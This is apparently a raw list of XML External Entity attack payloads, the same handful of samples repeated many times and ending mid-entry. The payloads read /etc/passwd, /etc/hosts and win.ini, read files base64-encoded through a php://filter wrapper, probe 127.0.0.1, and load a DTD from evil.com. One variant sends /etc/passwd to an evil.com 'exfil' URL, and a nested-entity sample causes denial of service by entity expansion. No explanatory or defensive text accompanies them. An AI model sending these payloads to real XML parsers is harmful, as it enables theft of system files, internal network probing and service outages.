<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---

<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<foo>&xxe;</foo>
---
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY a "1234567890" >
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;" >
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;" >
]>
<lolz>&c;</lolz>
---
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://evil.com/evil.dtd">
<data>&send;</data>
---
<?xml version="1.0"?>
<!DOCTYPE replace [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://evil.com/?exfil=%file;'>"> %eval; %error; ]>
<root/>
---
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
<foo><![CDATA[&xxe;]]></foo>
---
<?xml version="1.0"?>
<!DOCTYPE foo [
